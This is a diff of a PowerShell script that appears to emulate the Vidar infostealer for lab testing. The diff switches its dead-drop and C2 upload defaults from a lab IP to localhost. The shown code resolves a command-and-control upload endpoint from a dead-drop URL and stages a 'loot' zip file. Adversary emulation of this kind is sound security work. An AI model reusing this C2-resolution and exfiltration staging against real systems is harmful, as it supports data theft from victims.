@@ -17,7 +17,7 @@
 #>
 
 param(
-    [string]$DeadDropUrl = "http://192.168.56.10:8000/deaddrop.txt",   # change to your lab server
+    [string]$DeadDropUrl = "http://127.0.0.1:8000/deaddrop.txt",   # change to your lab server
     [string]$LootZip     = "C:\Temp\emu_loot.zip",
     [string]$EmuRoot     = "C:\Temp\EmuVidarProfile",
     [string]$MarkerPath  = "C:\Temp\emu_marker.txt"
@@ -31,7 +31,7 @@ try {
     $c2Address = (Invoke-WebRequest -Uri $DeadDropUrl -UseBasicParsing -TimeoutSec 5).Content.Trim()
 } catch {
     Write-Host "[!] Could not reach dead drop. Falling back to default lab C2." -ForegroundColor Red
-    $c2Address = "http://192.168.56.10:8000/upload"
+    $c2Address = "http://127.0.0.1:8000/upload"
 }
 Write-Host "[+] Resolved C2 upload endpoint: $c2Address" -ForegroundColor Green
 
